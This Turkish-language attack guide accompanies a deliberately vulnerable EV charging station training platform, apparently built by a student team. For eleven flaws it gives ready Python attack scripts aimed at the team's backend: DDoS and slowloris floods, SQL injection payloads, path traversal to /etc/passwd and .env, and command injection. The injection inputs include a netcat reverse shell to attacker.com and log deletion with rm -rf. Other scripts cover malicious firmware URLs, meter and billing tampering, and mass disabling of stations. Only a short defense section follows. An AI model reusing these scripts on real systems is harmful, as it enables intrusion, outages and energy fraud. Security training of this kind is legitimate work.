# 🎯 EVCS Anomaly Platform - Detaylı Saldırı Rehberi

## 📖 İçindekiler
- [Giriş](#giriş)
- [Sistem Mimarisi](#sistem-mimarisi)
- [Hazırlık Adımları](#hazırlık-adımları)
- [Her Anomali için Saldırı Senaryoları](#saldırı-senaryoları)
- [Savunma Mekanizmaları](#savunma-mekanizmaları)
- [Sık Sorulan Sorular](#sık-sorulan-sorular)

---

## 🎓 Giriş

Bu platform, **Elektrikli Araç Şarj İstasyonları (EVCS)** üzerinde gerçekleştirilebilecek siber saldırıları **eğitim amaçlı** simüle eder.

### ⚠️ ÖNEMLİ UYARILAR:
1. Bu sistem **SADECE EĞİTİM AMAÇLIDIR**
2. Öğrendiğiniz teknikleri **ASLA** gerçek sistemlerde kullanmayın
3. Tüm zayıflıklar **KASıTLI olarak** eklenmiştir
4. Yasal sorumluluk size aittir

### 🎯 Hedefler:
- Siber güvenlik zafiyetlerini anlamak
- Saldırı tekniklerini öğrenmek
- Savunma stratejileri geliştirmek
- Güvenli kod yazma prensiplerini kavramak

---

## 🏗️ Sistem Mimarisi

```
┌─────────────────┐         ┌──────────────────┐         ┌─────────────────┐
│   SALDIRGAN     │────────▶│    BACKEND       │────────▶│    DATABASE     │
│  (Siz / SDK)    │         │  (FastAPI/Python)│         │  (Simulated)    │
└─────────────────┘         └──────────────────┘         └─────────────────┘
        │                            │
        │                            │
        ▼                            ▼
┌─────────────────┐         ┌──────────────────┐
│   FRONTEND      │         │   SIMULATION     │
│  (Next.js/Web)  │         │     ENGINE       │
└─────────────────┘         └──────────────────┘
```

### Sistemin Bileşenleri:

**Backend:**
- Lokasyon: `/backend/app/`
- Framework: FastAPI (Python)
- Port: 8000 (local) / Render (production)
- Vulnerable Endpoints: `/vulnerable/*`

**Frontend:**
- Lokasyon: `/frontend/`
- Framework: Next.js (TypeScript)
- URL: https://simulasyon.vercel.app/

**SDK:**
- Dosya: `/sdk/evcs_attack.py`
- Dil: Python
- Kullanım: Saldırı scriptleri için

---

## 🔧 Hazırlık Adımları

### 1. Gerekli Yazılımlar

#### A. Python Kurulumu
```bash
# Kurulu mu kontrol et
python --version

# Değilse indir: https://www.python.org/downloads/
# Kurulum sırasında "Add to PATH" seçeneğini işaretle!
```

#### B. Gerekli Kütüphaneler
```bash
pip install requests
```

#### C. Kod Editörü (Opsiyonel ama önerilir)
- [VS Code](https://code.visualstudio.com/) - Önerilir
- Notepad++ - Basit projeler için
- PyCharm - Profesyonel geliştirme için

### 2. SDK Kurulumu

**Adım 1:** SDK'yi indirin
```bash
# GitHub'dan indir
curl -o evcs_attack.py https://raw.githubusercontent.com/sametyesilot/simulasyon/main/sdk/evcs_attack.py
```

**veya manuel:**
1. Şu adrese gidin: https://github.com/sametyesilot/simulasyon/tree/main/sdk
2. `evcs_attack.py` dosyasını indirin
3. Masaüstünde `EVCS_Test` klasörü oluşturun
4. SDK dosyasını oraya kaydedin

### 3. API Anahtarı Alma

Proje yöneticinizden (Samet) size özel bir API Key alın:
```
Örnek: "bsg-team-2024-secret-key"
```

---

## 💣 Saldırı Senaryoları

Her anomali için:
1. ✅ Zayıflık açıklaması
2. ✅ Kod satırı lokasyonu
3. ✅ Saldırı kodu örneği
4. ✅ Beklenen sonuç
5. ✅ Savunma önerileri

---

### 1️⃣ DDoS (Distributed Denial of Service) - Ahmet

**Anomali ID:** `ahmet-ddos`

**Zayıflık:** Rate limiting (istek sınırlaması) yok

**Koddaki Lokasyon:**
```
Dosya: backend/app/api/routes_vulnerable.py
Satır: 15-30
Fonksiyon: ddos_endpoint()
```

**Zayıflığın Nedeni:**
```python
# ❌ YANLIŞ (Mevcut kod):
@router.post("/ddos-target")
def ddos_endpoint(requests_count: int = 1):
    results = []
    for i in range(requests_count):  # Sınırsız işlem!
        results.append({"id": i, "processed": True})
    return {"processed": len(results)}
```

**✅ Doğru Olması Gereken:**
```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@router.post("/ddos-target")
@limiter.limit("10/minute")  # Dakikada max 10 istek
def ddos_endpoint(requests_count: int = 1):
    # ... kod ...
```

#### 🎯 Saldırı Senaryosu

**Basit Saldırı:**
```python
# Dosya: ddos_attack.py
import requests
import threading

BACKEND_URL = "https://evcs-backend-samet.onrender.com"

def send_request():
    try:
        r = requests.post(
            f"{BACKEND_URL}/vulnerable/ddos-target",
            json={"requests_count": 1000}
        )
        print(f"✓ Gönderildi: {r.status_code}")
    except Exception as e:
        print(f"✗ Hata: {e}")

# 100 paralel thread başlat
for i in range(100):
    t = threading.Thread(target=send_request)
    t.start()
    print(f"Thread {i+1} başlatıldı")
```

**Gelişmiş Saldırı (Botnet Simülasyonu):**
```python
import requests
from concurrent.futures import ThreadPoolExecutor
import time

def botnet_attack(bot_id):
    """Her bot sürekli istek gönderir"""
    while True:
        try:
            requests.post(
                f"{BACKEND_URL}/vulnerable/ddos-target",
                json={"requests_count": 500},
                timeout=1
            )
            print(f"Bot-{bot_id}: Saldırı devam ediyor...")
        except:
            pass
        time.sleep(0.1)

# 50 bot ile saldır
with ThreadPoolExecutor(max_workers=50) as executor:
    for i in range(50):
        executor.submit(botnet_attack, i)
```

**Beklenen Sonuç:**
- ⚠️ Backend cevap vermeyi durdurur
- ⚠️ Diğer kullanıcılar sisteme erişemez
- ⚠️ 503 Service Unavailable hataları
- ⚠️ CPU %100'e çıkar

**Nasıl Tespit Edilir:**
- Ani RPS (Request Per Second) artışı
- Aynı IP'den çok sayıda istek
- Response time artışı

---

### 2️⃣ SQL Injection (Authentication Bypass) - Atahan

**Anomali ID:** `atahan-auth-bypass`

**Zayıflık:** Kullanıcı girdisi doğrudan SQL sorgusuna ekleniyor

**Koddaki Lokasyon:**
```
Dosya: backend/app/api/routes_vulnerable.py
Satır: 33-62
Fonksiyon: check_auth_vulnerable()
```

**Zayıflığın Nedeni:**
```python
# ❌ YANLIŞ (Mevcut kod):
@router.get("/auth-check")
def check_auth_vulnerable(username: str, password: str):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    # ^^ Tehlikeli! Kullanıcı input'u direkt sorguya ekleniyor
```

**✅ Doğru Olması Gereken:**
```python
from sqlalchemy import text

@router.get("/auth-check")
def check_auth_secure(username: str, password: str):
    # Parametreli sorgu kullan
    query = text("SELECT * FROM users WHERE username=:user AND password=:pass")
    result = db.execute(query, {"user": username, "pass": password})
```

#### 🎯 Saldırı Senaryosu

**Klasik SQL Injection:**
```python
# Dosya: sql_injection_attack.py
import requests

BACKEND_URL = "https://evcs-backend-samet.onrender.com"

# Saldırı payloadları
payloads = [
    {"username": "admin' OR '1'='1", "password": "anything"},
    {"username": "admin'--", "password": ""},
    {"username": "' OR 1=1--", "password": ""},
    {"username": "admin' OR '1'='1' /*", "password": "anything"}
]

for i, payload in enumerate(payloads, 1):
    print(f"\n[Deneme {i}] Payload: {payload}")
    
    r = requests.get(
        f"{BACKEND_URL}/vulnerable/auth-check",
        params=payload
    )
    
    result = r.json()
    print(f"Sonuç: {result}")
    
    if result.get("authenticated"):
        print("🚨 BAŞARILI! Admin erişimi sağlandı!")
        print(f"Role: {result.get('role')}")
        break
```

**Veri Çalma (Data Exfiltration):**
```python
# Union-based SQL Injection
payload = {
    "username": "admin' UNION SELECT password FROM users--",
    "password": ""
}

r = requests.get(
    f"{BACKEND_URL}/vulnerable/auth-check",
    params=payload
)

print("Çalınan veriler:", r.json())
```

**Beklenen Sonuç:**
```json
{
  "authenticated": true,
  "role": "admin",
  "vulnerability": "SQL Injection successful!",
  "injected_query": "SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'"
}
```

---

### 3️⃣ Energy Theft (Parameter Tampering) - Samet

**Anomali ID:** `samet-energy-theft`

**Zayıflık:** Fiyat ve enerji değerleri client tarafından kontrol ediliyor

**Koddaki Lokasyon:**
```
Dosya: backend/app/api/routes_vulnerable.py
Satır: 65-105
Fonksiyon: submit_meter_reading()
```

#### 🎯 Saldırı Senaryosu

```python
# Dosya: energy_theft_attack.py
import requests

BACKEND_URL = "https://evcs-backend-samet.onrender.com"

# Gerçek senaryo:
# - Araç 100 kWh enerji çekti
# - Normal fiyat: 5 TL/kWh = 500 TL
# - Saldırgan bunu manipüle edecek

print("=== ENERJİ HIRSIZLIĞI SİMÜLASYONU ===\n")

# Normal kullanım (referans)
normal_request = {
    "session_id": "SESS-001",
    "energy_kwh": 100.0,
    "price": 5.0
}

print("1) Normal Kullanım:")
r = requests.post(
    f"{BACKEND_URL}/vulnerable/meter-reading",
    json=normal_request
)
print(f"   Toplam Maliyet: {r.json()['total_cost']} TL\n")

# SALDIRI 1: Enerji değerini düşür
theft_request_1 = {
    "session_id": "SESS-002",
    "energy_kwh": 1.0,      # ❌ 100 yerine 1
    "price": 5.0
}

print("2) Saldırı - Düşük Enerji Bildirimi:")
r = requests.post(
    f"{BACKEND_URL}/vulnerable/meter-reading",
    json=theft_request_1
)
result = r.json()
print(f"   Bildirilen Enerji: {result['reported_energy']} kWh")
print(f"   Ödenen: {result['total_cost']} TL")
print(f"   🚨 Çalınan Enerji: {result['energy_stolen']} kWh\n")

# SALDIRI 2: Fiyatı sıfırla
theft_request_2 = {
    "session_id": "SESS-003",
    "energy_kwh": 100.0,
    "price": 0.01          # ❌ 5.0 yerine 0.01
}

print("3) Saldırı - Fiyat Manipülasyonu:")
r = requests.post(
    f"{BACKEND_URL}/vulnerable/meter-reading",
    json=theft_request_2
)
result = r.json()
print(f"   Ödenen: {result['total_cost']} TL (olması gereken: 500 TL)")
print(f"   🚨 Kazanç: {500 - result['total_cost']} TL\n")

# SALDIRI 3: Her ikisi birden
theft_request_3 = {
    "session_id": "SESS-004",
    "energy_kwh": 0.1,
    "price": 0.01
}

print("4) Saldırı - Kombine Manipülasyon:")
r = requests.post(
    f"{BACKEND_URL}/vulnerable/meter-reading",
    json=theft_request_3
)
print(f"   Ödenen: {r.json()['total_cost']} TL")
print(f"   🚨 TOPLAM KÂÇAK: ~500 TL değerinde enerji!")
```

---

### 4️⃣ Man-in-the-Middle (OCPP Protocol) - Yusuf

**Anomali ID:** `yusuf-mitm-ocpp`

**Zayıflık:** Mesaj imzası doğrulanmıyor

**Koddaki Lokasyon:**
```
Dosya: backend/app/api/routes_vulnerable.py
Satır: 108-135
Fonksiyon: ocpp_message_handler()
```

#### 🎯 Saldırı Senaryosu

```python
# Dosya: mitm_ocpp_attack.py
import requests
import json
import time

BACKEND_URL = "https://evcs-backend-samet.onrender.com"

print("=== OCPP MAN-IN-THE-MIDDLE SALDIRISI ===\n")

# Senaryo: Şarj devam ederken StopTransaction mesajı gönder
# Kullanıcı 100 kWh şarj yapmaya devam edecek ama kayıt durdurulacak

# 1. Normal Start Transaction
start_msg = {
    "message": {
        "action": "StartTransaction",
        "connectorId": 1,
        "id TagId": "RFID-12345",
        "meterStart": 0,
        "timestamp": time.time()
    },
    "signature": "original-valid-signature"
}

print("1) Şarj Başlatılıyor...")
r = requests.post(
    f"{BACKEND_URL}/vulnerable/ocpp-message",
    json=start_msg
)
print(f"   Durum: {r.json()['status']}\n")

# 2. SALDIRI: Sahte StopTransaction gönder
fake_stop_msg = {
    "message": {
        "action": "StopTransaction",
        "transactionId": "12345",
        "meterStop": 5,          # ❌ Gerçekte meter: 100
        "timestamp": time.time(),
        "reason": "EVDisconnected"  # Sahte sebep
    },
    "signature": "FAKE-SIGNATURE"  # ❌ Geçersiz imza ama kontrol edilmiyor!
}

print("2) 🚨 SALDIRI: Sahte StopTransaction gönderiliyor...")
r = requests.post(
    f"{BACKEND_URL}/vulnerable/ocpp-message",
    json=fake_stop_msg
)
result = r.json()

if result['status'] == 'accepted':
    print("   ✅ Sahte mesaj kabul edildi!")
    print(f"   ⚠️ Zayıflık: {result['vulnerability']}")
    print(f"   🚨 Şarj kayıtlara göre durdu ama fiziksel şarj devam ediyor!")
    print("   💰 Kullanıcı bedava enerji çekmeye devam edecek!\n")

# 3. Mesaj içeriğini değiştir
modified_msg = {
    "message": {
        "action": "MeterValues",
        "connectorId": 1,
        "transactionId": "12345",
        "meterValue": [
            {
                "timestamp": time.time(),
                "sampledValue": [
                    {
                        "value": "10",      # ❌ Gerçek: 50 kWh
                        "unit": "Wh"
                    }
                ]
            }
        ]
    },
    "signature": "manipulated-sig"
}

print("3) Meter değerleri manipüle ediliyor...")
r = requests.post(
    f"{BACKEND_URL}/vulnerable/ocpp-message",
    json=modified_msg
)
print(f"   Kabul edildi: {r.json()['status'] == 'accepted'}")
print("   🚨 Gerçek tüketim gizlendi!")
```

---

### 5️⃣ Path Traversal (Firmware Download) - Gökdeniz

**Anomali ID:** `gokdeniz-firmware`

**Zayıflık:** Dosya yolu güvenlik kontrolü yok

**Koddaki Lokasyon:**
```
Dosya: backend/app/api/routes_vulnerable.py
Satır: 138-172
Fonksiyon: download_firmware()
```

#### 🎯 Saldırı Senaryosu

```python
# Dosya: path_traversal_attack.py
import requests

BACKEND_URL = "https://evcs-backend-samet.onrender.com"

print("=== PATH TRAVERSAL SALDIRISI ===\n")

# Test edilecek payloadlar
payloads = [
    "../../../etc/passwd",           # Linux sistem dosyası
    "..\\..\\..\\windows\\system32\\config\\sam",  # Windows
    "../../../app/core/config.py",   # Uygulama ayarları
    "../../../../.env",              # Çevre değişkenleri (API keys!)
    "../../../database/users.db",    # Veritabanı
]

for payload in payloads:
    print(f"Deneme: {payload}")
    
    r = requests.get(
        f"{BACKEND_URL}/vulnerable/firmware-download",
        params={"filename": payload}
    )
    
    result = r.json()
    
    if "vulnerability" in result:
        print(f"  🚨 BAŞARILI! Erişilen dosya: {result['accessed_file']}")
        print(f"  ⚠️ {result['warning']}\n")
    else:
        print(f"  📥 İndirilen: {result['file']}\n")

# Zararlı firmware yükleme
print("\n=== ZARLI FIRMWARE YÜKLEME ===")
malicious_payload = "http://attacker.com/backdoor.bin"

r = requests.get(
    f"{BACKEND_URL}/vulnerable/firmware-download",
    params={"filename": malicious_payload}
)

print(f"Sonuç: {r.json()}")
```

---

### 6️⃣ Command Injection (Voltage Control) - Yunus

**Anomali ID:** `yunus-offgrid-voltage`

**Zayıflık:** Sistem komutu input filtrelenmeden çalıştırılıyor

**Koddaki Lokasyon:**
```
Dosya: backend/app/api/routes_vulnerable.py
Satır: 175-219
Fonksiyon: set_voltage_control()
```

#### 🎯 Saldırı Senaryosu

```python
# Dosya: command_injection_attack.py
import requests

BACKEND_URL = "https://evcs-backend-samet.onrender.com"

print("=== COMMAND INJECTION SALDIRISI ===\n")

# SALDIRI 1: Sistem dosyalarını oku
payload_1 = {
    "voltage_value": "450",
    "dump_load_cmd": "enable; cat /etc/passwd; #"
}

print("1) Sistem dosyası okuma denemesi:")
r = requests.post(
    f"{BACKEND_URL}/vulnerable/set-voltage",
    json=payload_1
)
print(f"   Sonuç: {r.json()}\n")

# SALDIRI 2: Reverse shell
payload_2 = {
    "voltage_value": "450",
    "dump_load_cmd": "disable; nc attacker.com 4444 -e /bin/bash; #"
}

print("2) Reverse shell kurma:")
r = requests.post(
    f"{BACKEND_URL}/vulnerable/set-voltage",
    json=payload_2
)
print(f"   🚨 {r.json()}\n")

# SALDIRI 3: Tehlikeli voltaj + dump load devre dışı
payload_3 = {
    "voltage_value": "1500",  # Normal: 400V, Max güvenli: 500V
    "dump_load_cmd": "disable; rm -rf /var/log/*; #"
}

print("3) Donanıma zarar + log silme:")
r = requests.post(
    f"{BACKEND_URL}/vulnerable/set-voltage",
    json=payload_3
)
result = r.json()
print(f"   Voltaj: {result['voltage']} (TEHLİKELİ!)")
print(f"   Dump Load: {result['dump_load']}")
print(f"   ⚡ Batarya hasarı riski!\n")
```

---

### 7️⃣ Timestamp Manipulation (Blockchain) - Beyza

**Anomali ID:** `beyza-blockchain-delay`

#### 🎯 Saldırı Senaryosu

```python
# Dosya: blockchain_attack.py
import requests
import time

BACKEND_URL = "https://evcs-backend-samet.onrender.com"

print("=== BLOCKCHAIN TIMESTAMP MANİPÜLASYONU ===\n")

current_time = int(time.time())

# SALDIRI: Geçmiş tarihli işlem gönder
fake_timestamp = current_time - 3600  # 1 saat önce

transaction = {
    "from": "0xAttacker123",
    "to": "0xVictim456",
    "amount": 100,
    "fee": 0.001
}

payload = {
    "transaction": transaction,
    "timestamp": fake_timestamp
}

r = requests.post(
    f"{BACKEND_URL}/vulnerable/blockchain-transaction",
    json=payload
)

result = r.json()
print(f"İşlem ID: {result['transaction_id']}")
print(f"Gönderilen zaman: {fake_timestamp}")
print(f"Gerçek zaman: {result['server_time']}")
print(f"Fark: {result['time_difference_seconds']} saniye")
print(f"\n🚨 {result['vulnerability']}")
print(f"⚠️ {result['warning']}")
```

---

### 8️⃣ Supply Chain Attack (Unsigned Firmware) - Miraç

**Anomali ID:** `mirac-supply-chain`

#### 🎯 Saldırı Senaryosu

```python
# Dosya: supply_chain_attack.py
import requests

BACKEND_URL = "https://evcs-backend-samet.onrender.com"

print("=== SUPPLY CHAIN SALDIRISI ===\n")

# Sahte firmware sunucusu
malicious_url = "http://evil-attacker.com/backdoor_firmware_v2.bin"

payload = {
    "firmware_url": malicious_url,
    "version": "2.0.0",
    "checksum": "abc123fake"  # Sahte checksum
}

r = requests.post(
    f"{BACKEND_URL}/vulnerable/firmware-update",
    json=payload
)

result = r.json()

if result['status'] == 'update_initiated':
    print("✅ Firmware güncelleme başlatıldı!")
    print(f"🚨 Zararlı URL: {result['firmware_url']}")
    print(f"⚠️ {result['vulnerability']}")
    print(f"💀 Backdoor kurulum riski: {result['malicious_potential']}")
```

---

### 9️⃣ IDOR Attack (Fake Fault Reporting) - Ömer

**Anomali ID:** `omer-fake-fault`

**Zayıflık:** Cihaz sahipliği doğrulanmıyor

#### 🎯 Saldırı Senaryosu

```python
# Dosya: idor_attack.py
import requests

BACKEND_URL = "https://evcs-backend-samet.onrender.com"

print("=== IDOR SALDIRISI - SAHTE ARIZA ===\n")

# Hedef: Tüm şarj istasyonlarını devre dışı bırak
targets = [f"EVSE-{i:03d}" for i in range(1, 51)]  # EVSE-001 to EVSE-050

print(f"Hedef: {len(targets)} şarj istasyonu\n")

for device_id in targets:
    payload = {
        "device_id": device_id,
        "fault_code": "CRITICAL_SYSTEM_FAULT",
        "override_status": True
    }
    
    r = requests.post(
        f"{BACKEND_URL}/vulnerable/report-fault",
        json=payload
    )
    
    result = r.json()
    
    if result['status'] == 'FAULTED':
        print(f"✅ {device_id}: DEVRE DIŞI BIRAKILDI")
    
print(f"\n🚨 {len(targets)} istasyon kullanılamaz hale getirildi!")
print("⚠️ Hiçbir kimlik doğrulama yapılmadı!")
```

---

### 🔟 Business Logic Flaw (Billing) - Merve

**Anomali ID:** `merve-billing`

#### 🎯 Saldırı Senaryosu

```python
# Dosya: billing_attack.py
import requests

BACKEND_URL = "https://evcs-backend-samet.onrender.com"

print("=== İŞ MANTIŞI SALDIRISI ===\n")

# SALDIRI 1: Ücretsiz tarife
print("1) Ücretsiz tarife kullanımı:")
payload_free = {
    "session_id": "SESS-ATTACK-001",
    "energy_kwh": 100.0,
    "tariff_id": "admin_free"  # 🚨 Gizli ücretsiz tarife
}

r = requests.post(
    f"{BACKEND_URL}/vulnerable/calculate-bill",
    json=payload_free
)
result = r.json()
print(f"   Enerji: {result['energy_kwh']} kWh")
print(f"   Ödenen: {result['total_cost']} TL (normal: 500 TL)\n")

# SALDIRI 2: Negatif fiyat (sistem size para ödüyor!)
print("2) Negatif fiyat sömürüsü:")
payload_negative = {
    "session_id": "SESS-ATTACK-002",
    "energy_kwh": 100.0,
    "tariff_id": "negative_rate"
}

r = requests.post(
    f"{BACKEND_URL}/vulnerable/calculate-bill",
    json=payload_negative
)
result = r.json()
print(f"   Fiyat/kWh: {result['rate_per_kwh']} TL")
print(f"   Toplam: {result['total_cost']} TL")
print(f"   💰 Sistem SIZE {abs(result['total_cost'])} TL ödedi!\n")

print(f"🚨 Kullanılan exploit: {result['exploit']}")
```

---

### 1️⃣1️⃣ Slowloris Attack (Network DoS) - Feyza

**Anomali ID:** `feyza-ddos-net`

#### 🎯 Saldırı Senaryosu

```python
# Dosya: slowloris_attack.py
import requests
import threading
import time

BACKEND_URL = "https://evcs-backend-samet.onrender.com"

def slowloris_connection(conn_id):
    """Uzun süren bağlantı oluştur"""
    try:
        print(f"[Conn-{conn_id}] Bağlantı açılıyor...")
        r = requests.get(
            f"{BACKEND_URL}/vulnerable/slow-endpoint",
            params={"delay": 300},  # 5 dakika bekle
            timeout=None  # Timeout yok!
        )
        print(f"[Conn-{conn_id}] Tamamlandı")
    except Exception as e:
        print(f"[Conn-{conn_id}] Hata: {e}")

print("=== SLOWLORIS SALDIRISI ===\n")
print("Hedef: Tüm bağlantı havuzunu (connection pool) doldurmak\n")

# 100 paralel yavaş bağlantı aç
threads = []
for i in range(100):
    t = threading.Thread(target=slowloris_connection, args=(i,))
    t.start()
    threads.append(t)
    time.sleep(0.1)  # Her 100ms'de bir yeni bağlantı

print(f"\n🚨 {len(threads)} aktif bağlantı oluşturuldu!")
print("⚠️ Normal kullanıcılar artık bağlanamıyor...")

# Kontrol et
time.sleep(5)
try:
    r = requests.get(f"{BACKEND_URL}/health", timeout=2)
    print(f"\n❌ Sağlık kontrolü başarısız: Timeout")
except:
    print(f"\n✅ Saldırı başarılı: Sunucu yanıt veremiyor!")
```

---

## 🛡️ Savunma Mekanizmaları

Her zayıflık için güvenli kod örnekleri ve çözüm önerileri:

### 1. DDoS Koruması
```python
from slowapi import Limiter
from slowapi.util import get_remote_address
from fastapi import Request

limiter = Limiter(key_func=get_remote_address)

@app.middleware("http")
async def add_rate_limit(request: Request, call_next):
    # IP bazlı rate limiting
    response = await call_next(request)
    return response
```

### 2. SQL Injection Koruması
```python
from sqlalchemy import text

# ✅ Parametreli sorgular kullan
query = text("SELECT * FROM users WHERE username=:user")
result = db.execute(query, {"user": username})
```

### 3. Input Validation
```python
from pydantic import BaseModel, Field, validator

class MeterReading(BaseModel):
    energy_kwh: float = Field(gt=0, lt=1000)  # 0-1000 arası
    
    @validator('energy_kwh')
    def validate_energy(cls, v):
        if v < 0:
            raise ValueError('Enerji negatif olamaz')
        return v
```

### 4. Signature Verification (OCPP)
```python
import hmac
import hashlib

def verify_signature(message, signature, secret_key):
    expected = hmac.new(
        secret_key.encode(),
        message.encode(),
        hashlib.sha256
    ).hexdigest()
    
    return hmac.compare_digest(expected, signature)
```

### 5. Path Traversal Koruması
```python
import os
from pathlib import Path

def safe_join(base_dir, filename):
    # Güvenli dosya yolu oluştur
    filepath = Path(base_dir) / filename
    filepath = filepath.resolve()
    
    # Base directory dışına çıkamaz
    if not str(filepath).startswith(str(Path(base_dir).resolve())):
        raise ValueError("Invalid file path")
    
    return filepath
```

---

## 🤔 Sık Sorulan Sorular

### S: Bu saldırıları gerçek sistemlerde deneyebilir miyim?
**C:** ❌ HAYIR! Bu illegal ve etik dışıdır. Sadece bu eğitim platformunda kullanın.

### S: Saldırı başarısız olursa ne yapmalıyım?
**C:**
1. Backend URL'ini kontrol edin
2. API Key'inizi doğrulayın
3. İnternet bağlantınızı kontrol edin
4. Kod hatalarını kontrol edin

### S: Frontend'de saldırıyı nasıl izlerim?
**C:**
1. https://simulasyon.vercel.app/ adresine gidinin
2. "Active Runs" bölümüne bakın
3. Saldırınızı bulun ve tıklayın
4. Grafik ve logları canlı izleyin

### S: Bu zayıflıklar gerçek sistemlerde de var mı?
**C:** Evet, maalesef birçok gerçek sistemde benzer hatalar vardır. Bu yüzden siber güvenlik önemlidir!

### S: Saldırılarım log'lanıyor mu?
**C:** Evet, tüm aktiviteler eğitim amaçlı kaydedilir.

---

## 📚 Ek Kaynaklar

- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **OCPP Protokolü:** https://www.openchargealliance.org/
- **Python Requests:** https://docs.python-requests.org/
- **Siber Güvenlik 101:** https://www.cybrary.it/

---

## ⚖️ Yasal Uyarı

Bu platform **sadece eğitim amaçlıdır**. Öğrendiğiniz bilgileri:
- ✅ Kendi test ortamlarınızda kullanabilirsiniz
- ✅ Güvenli kod yazmak için kullanabilirsiniz
- ❌ Başkalarının sistemlerinde KULLANMAYINIZ
- ❌ İzinsiz test yapmayınız

**Hukuki sorumluluk size aittir.**

---

**Son Güncelleme:** 2024-12-23  
**Versiyon:** 2.0  
**Hazırlayan:** BSG Team - Samet & Team
